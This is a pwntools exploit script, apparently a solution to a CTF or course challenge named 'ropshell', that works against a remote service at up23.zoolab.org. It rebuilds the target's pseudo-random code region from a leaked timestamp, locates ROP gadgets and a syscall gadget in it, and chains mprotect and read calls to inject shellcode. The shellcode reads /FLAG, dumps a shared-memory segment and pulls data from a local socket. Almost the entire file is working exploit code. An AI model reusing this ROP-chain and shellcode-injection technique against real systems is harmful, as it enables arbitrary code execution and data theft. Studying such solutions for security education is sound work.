#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import ctypes
import pow as pw
import re
from pwn import *

libc = ctypes.CDLL('libc.so.6')
context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

recv = []

print("==========================================")

for i in range(4):
    s = str(r.recvline())
    tmp = s.split(' ')
    tmp2 = tmp[-1]
    recv.append(tmp2[:-3])

print(recv)

# ===== local =====
# base = int(recv[1][2:], 16)
# timestamp = int(recv[0])

# ===== remote =====
base = int(recv[3][2:], 16)
timestamp = int(recv[2])

########################################

shell_code37 = asm('''
    mov rax, 60
    mov rdi, 37
    syscall
''')

shell_code1 = asm('''
    mov rax, 2     
    lea rdi, [rip+str]
    mov rsi, 0
    mov rdx, 0
    syscall
    mov rdi, rax 

    mov rax, 0
    mov rsi, rsp
    mov rdx, 1024
    syscall

    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp 
    syscall

    mov rax, 60
    mov rdi, 0
    syscall

    str: .String "/FLAG"
''')

shell_code2 = asm('''
    mov rax, 29
    mov rdi, 0x1337
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax    
    mov rax, 30
    mov rsi, 0
    mov rdx, 4096
    syscall

    mov rsi, rax
    mov rdx, 69  
    mov rax, 1     
    mov rdi, 1           
    syscall

    mov rdi, rax
    mov rax, 60
    syscall
''')

shell_code3 = asm('''
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov rbx, rax

    sub rsp, 16
    mov qword ptr [rsp], 2
    mov word ptr [rsp+2], 0x3713
    mov dword ptr [rsp+4], 0x0100007f
    mov qword ptr [rsp+8], 0

    lea rsi, [rsp]    

    mov rax, 42           
    mov rdi, rbx      
    mov rdx, 16
    syscall

    mov rax, 0     
    mov rdi, rbx    
    mov rsi, rsp
    mov rdx, 100
    syscall

    mov rdx, rax  
    mov rax, 1        
    mov rdi, 1            
    mov rsi, rsp                        
    syscall

    mov rdi, rax
    mov rax, 60
    syscall
''')

shell_code_entire = asm('''
    mov rax, 2     
    lea rdi, [rip+str]
    mov rsi, 0
    mov rdx, 0
    syscall
    mov rdi, rax 

    mov rax, 0
    mov rsi, rsp
    mov rdx, 1024
    syscall

    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp 
    syscall

    mov rax, 29
    mov rdi, 0x1337
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax    
    mov rax, 30
    mov rsi, 0
    mov rdx, 4096
    syscall

    mov rsi, rax
    mov rdx, 69  
    mov rax, 1     
    mov rdi, 1           
    syscall

    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov rbx, rax

    sub rsp, 16
    mov qword ptr [rsp], 2
    mov word ptr [rsp+2], 0x3713
    mov dword ptr [rsp+4], 0x0100007f
    mov qword ptr [rsp+8], 0

    lea rsi, [rsp]    

    mov rax, 42           
    mov rdi, rbx      
    mov rdx, 16
    syscall

    mov rax, 0     
    mov rdi, rbx    
    mov rsi, rsp
    mov rdx, 100
    syscall

    mov rdx, rax  
    mov rax, 1        
    mov rdi, 1            
    mov rsi, rsp                        
    syscall

    mov rdi, rax
    mov rax, 60
    syscall

    str: .String "/FLAG"
''')

########################################



assem_rax = '''
    ret
    pop rax
'''
assem_rdi = '''
    ret
    pop rdi
'''
assem_rsi = '''
    ret
    pop rsi
'''
assem_rdx = '''
    ret
    pop rdx
'''

mprotect_read = [assem_rax, assem_rdi, assem_rsi, assem_rdx,     # mprotect
                assem_rax, assem_rdi, assem_rsi, assem_rdx,       # read
                assem_rax, assem_rdi]                        # exit

initial = mprotect_read

n = len(initial)
payloads = []

for i in range(n):
    tmp_payload = asm(initial[i]).hex()
    payloads.append(tmp_payload)

len_code = (10* 0x10000)

codeint = []

t = timestamp
libc.srand(t)

for i in range(int(len_code/4)):
    random_number1 = (libc.rand() << 16) & 0xffffffff
    random_number2 = libc.rand() & 0xffff
    codeint.append(hex(random_number1 | random_number2))

sys_idx = int((libc.rand() % (len_code/4 - 1)))
codeint[sys_idx] = hex(0xc3050f)

low = []
high = []

for ele in codeint:
    hex_str = ele[2:]
    hex_ele = int(hex_str, 16)
    lower_part = hex_ele & 0xffff
    higher_part = (hex_ele >> 16) & 0xffff
    low.append(hex(lower_part))
    high.append(hex(higher_part))

send_address = []

codeint_len = len(codeint)


for i in range(n):
    found = False
    address_found = False
    for j in range(len(low)):
        if low[j][2:] == payloads[i]:
            # print(f'lower is {low[j][2:]} payload is {payloads[i]} idex is {j}')
            found = True
            address_found = True
            idx = j
            break
    if not found:
        for j in range(len(high)):
            if high[j][2:] == payloads[i]:
                # print(f'high is {high[j][2:]} payload is {payloads[i]} index is {j}')
                idx = j
                address_found = True
                break
    if not address_found:
        print("assembly not found")
        print(f'assembly is {assem[i]}')
        raise
    target_address = base + idx*4  if found else base + idx*4 + 2
    send_address.append(target_address)


target_shell_code = shell_code_entire

r.send(p64(send_address[0]) + p64(10) + p64(send_address[1]) + p64(base) + p64(send_address[2]) + p64(1024) + p64(send_address[3]) + p64(7) + p64(sys_idx*4 + base)
        + p64(send_address[4]) + p64(0) + p64(send_address[5]) + p64(0) + p64(send_address[6]) + p64(base) + p64(send_address[7]) + p64(1024) + p64(sys_idx*4 + base) 
        + p64(base)) 

r.send(target_shell_code)

print("==========================================")

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
